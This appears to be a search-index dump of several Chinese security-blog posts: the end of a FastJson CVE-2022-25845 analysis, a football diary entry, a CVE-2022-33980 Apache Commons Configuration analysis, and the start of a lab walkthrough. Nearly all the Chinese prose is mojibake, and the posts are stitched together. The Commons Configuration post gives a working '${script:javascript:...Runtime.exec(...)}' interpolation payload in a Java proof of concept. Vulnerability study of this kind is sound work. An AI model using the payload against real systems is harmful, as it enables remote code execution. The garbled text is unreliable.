java.lang.Runnable java.lang.AutoCloseable java.io.Closeable java.lang.Iterable java.util.Collection java.lang.Readable java.util.EventListener ä¹Ÿå¯ä»¥åœ¨ fastjson-blacklist æŸ¥çœ‹åˆ°æ›´å¤šè¢«åˆ—å…¥é»‘åå•çš„ç±»ã€‚è¿™ä¸ªä»“åº“ç»´æŠ¤äº†è¢«åˆ—å…¥Fastjsoné»‘åå•çš„ç±»çš„hashå€¼ã€‚\nç„¶åï¼Œä»£ç å°†å°è¯•æ‰¾åˆ°ä¸€ä¸ªååºåˆ—åŒ–å™¨deserializerï¼Œç”¨æ¥å¯¹è¿™ä¸ªå·²ç»è¢«JSONåºåˆ—åŒ–çš„ç±»è¿›è¡Œååºåˆ—åŒ–ã€‚\nè¿›å…¥com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class\u0026lt;?\u0026gt;, java.lang.reflect.Type)æŸ¥çœ‹å…·ä½“çš„æµç¨‹ï¼Œåœ¨å†…éƒ¨æœ‰ä¸€ä¸ªå…³é”®æ£€æŸ¥ï¼Œæ£€æŸ¥ç›®æ ‡ç±»æ˜¯å¦ç»§æ‰¿äº†Throwableç±»\næ¥ç€ï¼Œè¿›å…¥ThrowableDeserializer.deserialize()ç»§ç»­åˆ†æï¼Œå¦‚æœå­˜åœ¨â€œ@typeâ€ï¼Œå®ƒå°†ä½¿ç”¨ checkAutoTypeæ£€æŸ¥å¹¶ç»§ç»­æ­£å¸¸ååºåˆ—åŒ–ï¼š\næ‰€ä»¥æˆ‘ä»¬åªè¦ç›®æ ‡ç±»ç»§æ‰¿äº†Throwableï¼ŒFastjsonä¾¿å¯ä»¥ååºåˆ—åŒ–ä¸ºä»»æ„ç±»ï¼\nåœ¨ThrowableDeserializer#deserialzeé€šè¿‡createExceptionå‡½æ•°è¿›è¡Œåˆ›å»ºååºåˆ—åŒ–ç±»ï¼Œå¤„ç†äº† 3 ç§ä¸åŒç±»å‹çš„æ„é€ å‡½æ•°ã€‚ä¸€ä¸ªæ²¡æœ‰ä»»ä½•å‚æ•°ï¼Œä¸€ä¸ªå¸¦æœ‰å¼‚å¸¸æ¶ˆæ¯çš„å‚æ•°ï¼Œä¸€ä¸ªå¸¦æœ‰å¼‚å¸¸æ¶ˆæ¯å’Œå¼‚å¸¸åŸå› å‚æ•°ã€‚åœ¨æ­¤ä¹‹åï¼Œå®ƒå°†å…ˆå°è¯•è°ƒç”¨æ›´ä¸ºå¤æ‚çš„æ„é€ å‡½æ•°ï¼ˆcauseConstructorã€messageConstructor å’Œ defaultConstructorï¼‰ï¼š\nåœ¨ThrowableDeserializeræœ€åï¼Œä½œä¸ºç±»å®ä¾‹åŒ–çš„ä¸€æ­¥ï¼Œè¿˜ä¼šä¸ºæ¯ä¸ªç›¸å…³æˆå‘˜å˜é‡è°ƒç”¨ä¸€ä¸ª setteræ–¹æ³•ï¼š åœ¨æœ€åçš„setValueååºåˆ—åŒ–ä¸­å®ç°å‘½ä»¤æ‰§è¡Œã€‚\nGroovyé“¾åŸç† æŒ‡å®šæ˜¾å¼æœŸæœ›ç±»ï¼Œå®ä¾‹åŒ–XXXExceptionå¹¶è¢«åŠ å…¥ç±»ç¼“å­˜ é€šè¿‡XXXExceptionä¸­å¯æ§çš„å±æ€§å/å‚æ•°åï¼Œç”±éšå¼ç±»é—´å…³ç³»å®ä¾‹åŒ–å¹¶è¢«åŠ å…¥ç±»ç¼“å­˜ ç›´æ¥ä»ç¼“å­˜ä¸­æ‹¿å‡ºæ¥ç”¨ï¼Œæˆ–è€…è¿›ä¸€æ­¥é€’å½’è®©å…¶å®ƒç±»è¢«åŠ å…¥åˆ°ç¼“å­˜ è¿™é‡Œå› ä¸ºThrowableç±»å¯ä»¥ç”¨æ¥ç»•è¿‡AutoType\n0x05 ç¼“è§£æªæ–½ å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬1.2.83 1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; å¼€å¯safeMode é€šè¿‡ä»£ç é…ç½® ParserConfig.getGlobalInstance().setSafeMode(true); é€šè¿‡JVMå¯åŠ¨å‚æ•°é…ç½® -Dfastjson.parser.safeMode=true é€šè¿‡Fastjsonçš„é…ç½®æ–‡ä»¶é…ç½®é¡¹ fastjson.parser.safeMode=true å‡çº§åˆ°fastjson v2 0x06 æ€»ç»“ äº‹å®ä¸Šè¿™æ˜¯å­¦ä¹ çš„ç¬¬ä¸€ä¸ªFastJsonæ¼æ´ï¼Œé€šè¿‡åˆ†ææ„Ÿè§‰å¯¹FastJsonçš„AutoTypeæœºåˆ¶å’ŒJSONååºåˆ—åŒ–æ¼æ´çš„ä¸€äº›åŸç†ï¼ŒJavaå¯¹getã€setã€constructorç­‰å¯ä»¥åŠ å…¥æ¶æ„ä»£ç ä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œã€‚å®é™…ä¸Šï¼Œè¿™å‡ å¤©å­¦ä¹ è„‘è¢‹æ™•ä¹ä¹çš„ï¼Œè¾“çƒã€é¡¹ç›®å•¥çš„ä¸€å¤§å †çƒ¦å¿ƒäº‹ï¼Œä¹‹åä¼šå¯¹è¿›è¡Œè¿›ä¸€æ­¥çš„æ•´ç†ã€‚\n0x07 å‚è€ƒ https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/ https://alter1125.github.io/2022/07/29/CVE-2022-25845%20FastJson%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ https://hosch3n.github.io/2022/03/24/Fastjson-autoType%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%88%A9%E7%94%A8%E6%9C%9F%E6%9C%9B%E7%B1%BB https://github.com/YoungBear/FastjsonPoc ","permalink":"http://www.reus09.top/posts/tech/cve-2022-25845-fastjson-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","summary":"å®é™…ä¸Šä¿ç ”åã€åä¸€å‡æœŸä¹‹åï¼Œä¸€ç›´åœ¨æ‘†çƒ‚ã€èººå¹³(å……åˆ†æ„Ÿå—åˆ°ç ”ç©¶ç”Ÿæ‰“å·¥ä»”çš„å‘½è¿)ï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯æƒ³åˆ†æä¸€ä¸‹FastJsonæœ€æ–°çˆ†å‡ºæ¥çš„æ¼æ´CVE","title":"CVE-2022-25845 FastJson RCEæ¼æ´åˆ†æ"},{"content":"è™½è¯´æœ‰æ„Ÿï¼Œä½†å…¶å®å¤šç‰¹ä¸æ‹œä»çš„å›½å®¶å¾·æ¯”ä¹Ÿå®Œå®Œå…¨å…¨çš„æ˜ å°„åœ¨æˆ‘çš„è¶³çƒè®°å¿†ï¼Œå……æ–¥åœ¨æˆ‘çš„å¤§å­¦ç”Ÿæ´»ä¸­ã€‚ æˆ‘çš„è¶³çƒèŒèŠ½èµ·æºäº2018å¹´ä¿„ç½—æ–¯ä¸–ç•Œæ¯ï¼Œå¾ˆæ™šæ‰æ¥è§¦åˆ°è¶³çƒï¼Œç®—ä¸Šå¦‚ä»Šå¤§å­¦ä¸‰å¹´ï¼Œæ¥è§¦è¶³çƒä¹Ÿä¸è¿‡å¯¥å¯¥å››å¹´ç½¢äº†ï¼Œä»ä¸€ä¸ªä¸ä¼šè¸¢ã€æ»¡è„‘å­æƒ³ç€èŠ±å¼è¿‡äººçš„è¿åŠ¨åºŸæåˆ°ç°åœ¨è‡ªè®¤ä¸ºæ„ˆå‘ä¸ä¼šè¸¢çš„åº¸äººã€‚å¯¹å¤šç‰¹çš„å°è±¡æœ€å¼€å§‹æ˜¯æºè‡ªé©¬å°”ç§‘-ç½—ä¼Šæ–¯ï¼Œå°ç«ç®­åœ¨ä¸–ç•Œæ¯ä¸Šé¢çš„æƒŠé¸¿ä¸€ç¥ï¼Œè®©æˆ‘è®¤è¯†åˆ°äº†è¿™ä¸ªå¤©å¦’è‹±æ‰çš„çƒå‘˜ï¼Œç„¶åå¯¹å¤šç‰¹è’™å¾·çš„å°è±¡å°±æ˜¯2018å¹´å¾·å›½å›½å®¶å¾·æ¯”å¤šç‰¹è’™å¾·ä¸‰æ¯”äºŒé€†è½¬æ‹œä»æ…•å°¼é»‘ï¼Œå¥”ç€å½“æ—¶é«˜ä¸­å°ä¼™ä¼´éƒ½å–œæ¬¢é€‰ä¸€ä¸ªä¸»é˜Ÿçš„æ°›å›´ï¼Œæˆ‘é€‰æ‹©é’æ˜¥é£æš´å¤§é»„èœ‚ä½œä¸ºä¸»é˜Ÿã€‚\nå››å¹´æ¥ï¼Œå¤šç‰¹è’™å¾·çš„æ•™ç»ƒèµ°é©¬è§‚èŠ±ï¼Œä»æ³•å¤«å°”ã€æ³°å°”é½å¥‡ã€ç½—æ³½ï¼Œè™½ç„¶å°±æˆ‘ä¸ªäººæ¥è¯´ï¼Œéƒ½æ˜¯ç›¸å¯¹å¹³åº¸çš„æ•™ç»ƒï¼Œä½†æ˜¯ä»Šå¤©æ³°å°”é½å¥‡ç‡é˜Ÿçš„å¤šç‰¹è’™å¾·å´è®©æˆ‘éš¾å¾—çš„çœ‹åˆ°äº†ä¸€ä¸ªå¼ºé˜Ÿè¯¥æœ‰çš„è¡€æ€§ã€é¡½å¼ºã€‚è¿™äº›å¹´ï¼Œè‡ª2019å¹´å¾·å›½è¶…çº§æ¯ä»¥æ¥ï¼Œæ‹œä»å¯¹é˜µå¤šç‰¹å·²ç»å…«è¿èƒœï¼Œè€Œä¸”å¤§éƒ¨åˆ†éƒ½æ˜¯å¤§æ¯”åˆ†è¡€æ´—ï¼Œå››æ¯”é›¶ã€äº”æ¯”é›¶ï¼å›½å®¶å¾·æ¯”å·²ç»å¾ˆå°‘çœ‹äº†ï¼Œåæ­£ä¹Ÿæ˜¯å¤§æ¯”åˆ†è¾“ç½¢äº†ã€‚\nä»Šå¤©å‡Œæ™¨çš„å›½å®¶å¾·æ¯”è¯´å¥å®è¯æˆ‘åªçœ‹äº†60åˆ†é’Ÿï¼Œä½†æ˜¯ä¸ŠåŠåœºå¤šç‰¹è’™å¾·çš„é˜²å®ˆçœŸçš„åšçš„éå¸¸æ£’ï¼Œçƒå‘˜çš„æ€åº¦éå¸¸çš„ç§¯æã€‚ä½†æ˜¯éšç€æ ¼é›·èŒ¨å¡ã€è¨å†…çš„ä¸¤è®°ä¸–ç•Œæ³¢ï¼Œé›¶æ¯”äºŒè½åï¼Œäº‹å®ä¸Šï¼Œé‰´äºå¤šç‰¹è’™å¾·é•¿ä¹…ä»¥æ¥ä¸ä¼šè¸¢é€†é£çƒã€çƒå‘˜å¿ƒæ€å®¹æ˜“å‡ºé—®é¢˜ã€è‡ªå·±å·²æœ‰äº›çŒç¡ï¼Œä¾¿æ²‰æ²‰ç¡å»ï¼Œä¹Ÿè®¸å¿ƒé‡Œè¿˜æœ‰å¹»æƒ³ä¹Ÿè¡Œèƒ½èµ¢ã€èƒ½é€†è½¬ã€ä¹Ÿè¡Œå‘¢ã€‚\næ—©æ™¨èµ·åºŠï¼Œæ‰“å¼€æ‰‹æœºï¼Œçœ‹åˆ°è¯»ç§’ç»å¹³ã€çœ‹åˆ°è§£è¯´å–œæè€Œæ³£çš„æ€’å¼ã€å®£æ³„ï¼Œè¿™ä¸‰å¹´æ¥ï¼Œå¤šç‰¹è’™å¾·çš„å…«è¿è´¥ç»ˆç»“äº†ï¼Œæ–°æ˜Ÿç©†ç§‘ç§‘æ‰³å›ä¸€çƒï¼Œè¢«æˆ‘ä¸€ç›´è¯Ÿç—…çš„â€æƒå¥åå®¿â€œè«å¾·æ–¯ç‰¹è¯»ç§’å¤´çƒç»å¹³ï¼Œè¿™æ˜¯å…¨é˜Ÿçš„åŠªåŠ›ã€æ‹¼æŠ¢æ¢æ¥çš„ï¼Œç¡®å®ä»¤äººæ„ŸåŠ¨ã€‚\nå®é™…ä¸Šï¼Œåœ¨ç”Ÿæ´»ä¸­ï¼Œéšç€ä¸‰å¹´å¤§å­¦ç”Ÿæ¶¯çš„è¿‡å»ï¼Œæ˜ å°„çš„æˆ‘çš„ç”Ÿæ´»ï¼Œå¹³å¹³æ— å¥‡ã€é»˜é»˜æ— é—»ã€æ³¯ç„¶ä¼—äººï¼Œæˆ‘å¯ä»¥æ¸…æ™°çš„å‘ç°æˆ‘çš„æ–‡å­—è¡¨è¾¾æ¬²åœ¨ä¸‹é™ï¼Œç¤¾äº¤è¡¨è¾¾æ¬²æœ›åœ¨ä¸‹é™ï¼Œæ­£å¦‚è¯»æˆ‘è¿™ç¯‡ä¹±ä¸ƒå…«ç³Ÿã€ä¸ƒé›¶å…«ç¢çš„æ–‡ç« ã€‚å¤§å­¦ä¸‰å¹´çš„å­¦ä¹ ï¼Œæ¢æ¥ä¸€ä¸ªä¿ç ”çš„èµ„æ ¼ï¼Œä½†æ˜¯ç ”ç©¶ç”Ÿçš„ç”Ÿæ´»å´è·Ÿæƒ³è±¡çš„ä¸å¤ªä¸€æ ·ï¼Œä¸‰å¹´ç”Ÿæ´»ä¸­ï¼Œæƒ³å­¦å¾ˆå¤šä¸œè¥¿ï¼Œå´éƒ½æ˜¯åŠé€”è€ŒåºŸï¼Œè‡ªä»¥ä¸ºæŠ€æœ¯å¾ˆå‰å®³ï¼Œå´æ˜¯è„šæœ¬å°å­ï¼Œäº•åº•ä¹‹è›™ã€‚\nå¸Œæœ›ï¼Œæ˜å¤©ä¼šæ›´å¥½ï¼Œå¸Œæœ›ï¼Œè‡ªå·±ä¼šæ›´å¼ºï¼Œå¸Œæœ›ï¼Œè‡ªå·±èƒ½æˆä¸ºä¸€ä¸ªæ›´å®Œæ•´çš„äººã€‚\n","permalink":"http://www.reus09.top/posts/life/%E8%A7%822022%E5%B9%B410%E6%9C%889%E6%97%A5%E5%A8%81%E6%96%AF%E7%89%B9%E6%B3%95%E4%BC%A6%E7%90%83%E5%9C%BA%E5%BE%B7%E5%9B%BD%E5%9B%BD%E5%AE%B6%E5%BE%B7%E6%AF%94%E6%9C%89%E6%84%9F/","summary":"è™½è¯´æœ‰æ„Ÿï¼Œä½†å…¶å®å¤šç‰¹ä¸æ‹œä»çš„å›½å®¶å¾·æ¯”ä¹Ÿå®Œå®Œå…¨å…¨çš„æ˜ å°„åœ¨æˆ‘çš„è¶³çƒè®°å¿†ï¼Œå……æ–¥åœ¨æˆ‘çš„å¤§å­¦ç”Ÿæ´»ä¸­ã€‚ æˆ‘çš„è¶³çƒèŒèŠ½èµ·æºäº2018å¹´ä¿„ç½—æ–¯ä¸–ç•Œæ¯ï¼Œå¾ˆæ™šæ‰æ¥","title":"è§‚2022å¹´10æœˆ9æ—¥å¨æ–¯ç‰¹æ³•ä¼¦çƒåœºå¾·å›½å›½å®¶å¾·æ¯”æœ‰æ„Ÿ"},{"content":"ä»Šå¤©åœ¨å…ˆçŸ¥ç¤¾åŒºçœ‹åˆ°äº†ä¸€ç¯‡æ–‡ç« å¯¹apache commons configurationæ—§ç‰ˆæœ¬çš„ä¸€ä¸ªRCEæ¼æ´åˆ†æçš„æ–‡ç« ï¼Œé˜…è¯»äº†ä¸€ä¸‹ï¼Œå‘ç°å…¶åˆ©ç”¨è¿‡ç¨‹è·Ÿlog4j2çš„ä¸€äº›å…±åŒç‚¹ï¼Œéƒ½ç”¨åˆ°äº†lookupå’Œä¸€äº›è¾“å…¥å¤„ç†çš„ä¸ä¸¥è°¨ã€‚æ¯”å¦‚è¯´å¯¹äºè¯¥æ¼æ´ï¼Œå¯ä»¥é€šè¿‡scriptå°†å…¶è§†ä¸ºjvmè„šæœ¬æ‰§è¡Œï¼Œä»è€Œå®ç°RCEï¼Œlog4j2åˆ™æ˜¯é€šè¿‡jndiåŠ è½½çš„å¯¹åº”ldapå¯¹åº”æœåŠ¡ä¸Šé¢çš„æ¶æ„ç±»ï¼Œä»è€Œå®ç°RCEã€‚ä¸‹é¢ç®€å•åˆ†æä¸€ä¸‹ã€‚\n0x01 æ¼æ´èƒŒæ™¯ Commons Configurationæ˜¯ä¸€ä¸ªjavaåº”ç”¨ç¨‹åºçš„é…ç½®ç®¡ç†ç±»åº“ã€‚å¯ä»¥ä»propertiesæˆ–è€…xmlæ–‡ä»¶ä¸­åŠ è½½è½¯ä»¶çš„é…ç½®ä¿¡æ¯ï¼Œç”¨æ¥æ„å»ºæ”¯æ’‘è½¯ä»¶è¿è¡Œçš„åŸºç¡€ç¯å¢ƒã€‚åœ¨ä¸€äº›é…ç½®æ–‡ä»¶è¾ƒå¤šè¾ƒçš„å¤æ‚çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨è¯¥é…ç½®å·¥å…·æ¯”è¾ƒå¯ä»¥ç®€åŒ–é…ç½®æ–‡ä»¶çš„è§£æå’Œç®¡ç†ã€‚ä¹Ÿæé«˜äº†å¼€å‘æ•ˆç‡å’Œè½¯ä»¶çš„å¯ç»´æŠ¤æ€§ã€‚\nå®ƒç›®å‰æ”¯æŒçš„é…ç½®æ–‡ä»¶æ ¼å¼æœ‰:\nProperties files\nXML documents\nWindows INI files\nProperty list files (plist)\nJNDIç­‰ç­‰\næ ¹æ®å®˜æ–¹ç»™å‡ºçš„æ¼æ´é€šæŠ¥: https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s\næ˜ç™½è¿™ä¸ªCVEçš„æ¼æ´ç‚¹æ˜¯åœ¨å˜é‡æ’å€¼ä¸­é€ æˆçš„\nåœ¨commons-configuration2æ¥è¯´ï¼Œå˜é‡æ’å€¼ï¼Œå°±ç±»ä¼¼äºå¼•ç”¨åŠ¨æ€å˜é‡çš„æ–¹å¼ï¼Œå°±å¥½æ¯”ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦è·å–ç³»ç»Ÿä¸­çš„æŸä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨${env:envname}, å¦‚æœéœ€è¦è·å–ç”¨æˆ·æ ¹ç›®å½•ï¼ŒåŒæ ·å¯ä»¥é€šè¿‡${sys:user.home} æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬é€šè¿‡é€šè¿‡commons-configuration2çš„é…ç½®ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€äº›æš´éœ²å‡ºæ¥çš„ç³»ç»Ÿä¿¡æ¯ 0x02 æ¼æ´ç¯å¢ƒæ­å»º æˆ‘ä»¬é€šè¿‡mavenå¯¼å…¥å—å½±å“çš„ç‰ˆæœ¬å³å¯:\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-configuration2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ç»™å‡ºæˆ‘ä»¬çš„å®ä¾‹demo:\næ ¹æ®å®˜æ–¹ç»™çš„è§£é‡Šï¼Œscriptæ ‡ç­¾å¯ä»¥å°†å…¶è§†ä¸ºjvmè„šæœ¬æ‰§è¡Œï¼Œå› æ­¤è¿™é‡Œç»™å‡ºpayload:${script:javascript:java.lang.Runtime.getRuntime().exec(\\\u0026quot;open /System/Applications/Calculator.app\\\u0026quot;)} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import org.apache.commons.configuration2.interpol.ConfigurationInterpolator; import org.apache.commons.configuration2.interpol.InterpolatorSpecification; public class ApacheCommonConfiguration { public static void main(String[] args) { InterpolatorSpecification interpolatorSpecification = new InterpolatorSpecification.Builder() .withPrefixLookups(ConfigurationInterpolator.getDefaultPrefixLookups()) .withDefaultLookups(ConfigurationInterpolator.getDefaultPrefixLookups().values()) .create(); //åˆ›å»ºç¤ºä¾‹ ConfigurationInterpolator configurationInterpolator = ConfigurationInterpolator.fromSpecification(interpolatorSpecification); // è§£æå­—ç¬¦ä¸² System.out.println(configurationInterpolator.interpolate(\u0026#34;${script:javascript:java.lang.Runtime.getRuntime().exec(\u0026#34;open /System/Applications/Calculator.app\u0026#34;)}\u0026#34;)); } } 0x03 æ¼æ´åˆ†æ é¦–å…ˆæˆ‘ä»¬åœ¨java.lang.Runtime#execæ‰“ä¸‹æ–­ç‚¹ï¼Œçœ‹ä¸€ä¸‹å‡½æ•°æ ˆçš„è°ƒç”¨æƒ…å†µï¼Œè¿™èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬æ›´å¥½çš„åˆ†ææ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 exec:348, Runtime (java.lang) invokeVirtual_LL_L:-1, 1044036744 (java.lang.invoke.LambdaForm$DMH) reinvoke:-1, 211968962 (java.lang.invoke.LambdaForm$BMH) exactInvoker:-1, 436546048 (java.lang.invoke.LambdaForm$MH) linkToCallSite:-1, 1300393335 (java.lang.invoke.LambdaForm$MH) :program:1, Script$\\^eval\\_ (jdk.nashorn.internal.scripts) invokeStatic_LL_L:-1, 142257191 (java.lang.invoke.LambdaForm$DMH) invokeExact_MT:-1, 1757676444 (java.lang.invoke.LambdaForm$MH) invoke:637, ScriptFunctionData (jdk.nashorn.internal.runtime) invoke:494, ScriptFunction (jdk.nashorn.internal.runtime) apply:393, ScriptRuntime (jdk.nashorn.internal.runtime) evalImpl:449, NashornScriptEngine (jdk.nashorn.api.scripting) evalImpl:406, NashornScriptEngine (jdk.nashorn.api.scripting) evalImpl:402, NashornScriptEngine (jdk.nashorn.api.scripting) eval:155, NashornScriptEngine (jdk.nashorn.api.scripting) eval:264, AbstractScriptEngine (javax.script) lookup:85, ScriptStringLookup (org.apache.commons.text.lookup) lookup:45, StringLookupAdapter (org.apache.commons.configuration2.interpol) resolve:497, ConfigurationInterpolator (org.apache.commons.configuration2.interpol) resolveSingleVariable:529, ConfigurationInterpolator (org.apache.commons.configuration2.interpol) interpolate:362, ConfigurationInterpolator (org.apache.commons.configuration2.interpol) main:22, ApacheCommonConfiguration æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼šä»–ä¸»è¦æ˜¯åœ¨org.apache.commons.configuration2.interpol.ConfigurationInterpolator#interpolateä¸­å¯¹è¿™ç§å†™æ³•è¿›è¡Œè§£æï¼Œèµ‹äºˆå…¶å¯¹åº”çš„å€¼ã€‚\næˆ‘ä»¬åœ¨è¿™é‡Œæ‰“ä¸‹æ–­ç‚¹ï¼Œæ–¹ä¾¿æ¯æ­¥æ›´ç›´è§‚çš„åˆ†æã€‚\nä¼ å…¥äº†å˜é‡æ’å€¼çš„å€¼ï¼Œé¦–å…ˆåˆ¤æ–­ä»–æ˜¯å¦æ˜¯Stringçš„å®ä¾‹ï¼Œä¹‹åå°†ä¼šè°ƒç”¨looksLikeSingleVariableè¿›è¡Œåˆ¤æ–­æ ¼å¼æ˜¯å¦æ­£ç¡®ã€‚\nå¦‚æœæ ¼å¼æ­£ç¡®å°±è¿›å…¥resolveSingleVariableçš„è¿‡ç¨‹ï¼Œè¿›è¡Œå–å€¼ï¼Œå¦‚æœä¸ç¬¦åˆæ ¼å¼çš„å°±ç›´æ¥è°ƒç”¨replaceæ–¹æ³•ã€‚é€šè¿‡è¿™ä¸€æ­¥åˆ¤æ–­æ˜¯å¦æ»¡è¶³${}çš„æ ¼å¼ã€‚\nå› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ¶æ„payloadæ˜¯ç¬¦åˆ${}æ ¼å¼çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šè¿›å…¥resolveSingleVariableæ–¹æ³•\nåœ¨extractVariableName()æ–¹æ³•ä¸­ï¼Œä¸»è¦æ˜¯å°†ä¼ å…¥çš„payloadçš„${}å»é™¤,å–å‡ºå˜é‡å€¼ï¼Œç„¶åå°†æ•´ç†ä¹‹åçš„æ•°æ®ä¼ é€’ç»™resolveå‡½æ•°\nç„¶åæˆ‘ä»¬è¿›å…¥resolve()å‡½æ•°è¿›è¡Œåˆ†æ\né¦–å…ˆé€šè¿‡åˆ†å‰²ç¬¦58 : ':',åˆ†åˆ«å–å‡ºprefix name valueå­—æ®µ\né€šè¿‡è°ƒç”¨fetchLookupForPrefixæ–¹æ³•ä¼ å…¥prefixï¼Œå–å‡ºå¯¹åº”çš„LookUpå¯¹è±¡\nç›´æ¥ä»prefixLookupsè¿™ä¸ªMapå¯¹è±¡å±æ€§ä¸­è·å–å¯¹åº”çš„StringLookupAdapterç±»ä¹‹åæˆ‘ä»¬ç´§è·Ÿç€è°ƒç”¨äº†lookupæ–¹æ³•\nè·å¾—äº†ScriptStringLookupç±»å¯¹è±¡ï¼Œè·Ÿè¿›å…¶lookupæ–¹æ³•çš„è°ƒç”¨ ä»–é¦–å…ˆä¼šé€šè¿‡:å°†å…¶è¿›è¡Œåˆ†éš”å¼€æ¥ï¼Œå¹¶åˆ¤æ–­äº†å…¶æ ¼å¼ï¼Œå†åˆ†åˆ«å–å‡ºäº†engineNameå’Œscriptä¹‹åï¼Œå°†ä¼šåœ¨åé¢é€šè¿‡è°ƒç”¨getEngineByNameæ–¹æ³•çš„è°ƒç”¨ä¼ å…¥engineNameï¼Œå¾—åˆ°äº†ScriptEngineä¸ºNashormScriptEngineç±» ç„¶åæˆ‘ä»¬è®¿é—®ScriptEngineçš„evalæ–¹æ³•çœ‹ä¸€ä¸‹\nå¸¦å…¥äº†scriptå’Œcontextå¯¹è±¡ç»§ç»­è°ƒç”¨evalæ–¹æ³•\nå‘ç°å…¶è°ƒç”¨evalImpl è·Ÿè¿›evalImplæ–¹æ³•åˆ°æœ€åæˆåŠŸæ‰§è¡Œäº†æˆ‘ä»¬çš„ä»£ç ï¼Œè¾¾åˆ°äº†å‘½ä»¤æ‰§è¡Œ\næœ€ç»ˆå®ç°äº†è®¡ç®—å™¨å¼¹çª—\n0x04 æ€»ç»“ ç»è¿‡è°ƒè¯•åˆ†æï¼Œæ¼æ´äº§ç”ŸåŸå› æ˜¯å› ä¸ºå˜é‡æ’å€¼çš„æ—¶å€™ï¼Œå› ä¸ºapacheéœ€è¦è§£æä¼ å…¥çš„å‚æ•°ï¼Œç„¶åæ‰§è¡Œä¼ å…¥çš„å‚æ•°çš„ä¸­keyå¯¹åº”çš„valueï¼Œå¦‚æœä¼ å…¥çš„æ˜¯Scriptï¼Œå¤©ç„¶å­˜åœ¨ä¸€ä¸ªevalå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ä¼ å…¥çš„å‚æ•°çš„valueä¸ºæˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œä»£ç ï¼Œä»è€Œå®ç°RCEã€‚\nå®˜æ–¹åé¢ç»™çš„è¡¥ä¸ä¹Ÿå¾ˆç®€å•ï¼Œhttps://github.com/apache/commons-configuration/commit/f025bc399e8125ffc7701ac74f09b833c5b5e152#diff-ae29e7f41cf746bc365d2cd17ca0cf535757498625a7203db240113021082f3f\næ–°ç‰ˆæœ¬é»˜è®¤å°†script url dnsç­‰prefixç»™å»é™¤äº†\n0x05 Refence https://xz.aliyun.com/t/11723 https://www.anquanke.com/post/id/276734 ","permalink":"http://www.reus09.top/posts/tech/cve-2022-33980-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","summary":"ä»Šå¤©åœ¨å…ˆçŸ¥ç¤¾åŒºçœ‹åˆ°äº†ä¸€ç¯‡æ–‡ç« å¯¹apache commons configurationæ—§ç‰ˆæœ¬çš„ä¸€ä¸ªRCEæ¼æ´åˆ†æçš„æ–‡ç« ï¼Œé˜…è¯»äº†ä¸€ä¸‹ï¼Œå‘ç°å…¶åˆ©ç”¨è¿‡ç¨‹è·Ÿlog4","title":"CVE-2022-33980 RCEæ¼æ´åˆ†æ"},{"content":"ä¹‹å‰åªæ˜¯äº†è§£è¿‡ä¸€äº›æ¸—é€å·¥å…·çš„ä½¿ç”¨è¿˜æœ‰ä¸€äº›æ¸—é€æ€è·¯ï¼Œè¿™æ¬¡é¶æœºjangow01çš„ç»ƒä¹ ç®—æ˜¯åšäº†ä¸€ä¸ªå°æ•´åˆã€‚ä½†å› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡åšï¼Œéš¾å…æœ‰äº›æŸæ‰‹æ— ç­–ã€æ²¡æœ‰æ€è·¯ï¼Œæ‰€ä»¥æ€»ä½“è¿˜æ˜¯å‚ç…§å…¶ä»–äººçš„æ€è·¯èµ°äº†ä¸€éï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†å¾ˆå¤šçš„ä¸œè¥¿ã€‚\n0x00 é”™è¯¯è§£å†³ jangow01ä½œè€…ç»™å‡ºçš„é¶æœºæ˜¯åŸºäºvirtualBoxçš„,ä½†æ˜¯æˆ‘ä¸ªäººæ„Ÿè§‰virtualBoxçš„ä½¿ç”¨ä¸Šé¢ç¡®å®ä¸å¦‚vmwareæ¥çš„åŠŸèƒ½å…¨é¢ã€ç›´æ¥ï¼Œæ‰€ä»¥æˆ‘è¿˜æ˜¯æŠŠjangow01çš„é¶æœºå¯¼å…¥åˆ°äº†vmwareé‡Œé¢ã€‚\nä½†æ˜¯è¿™ä¼šäº§ç”Ÿä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å› 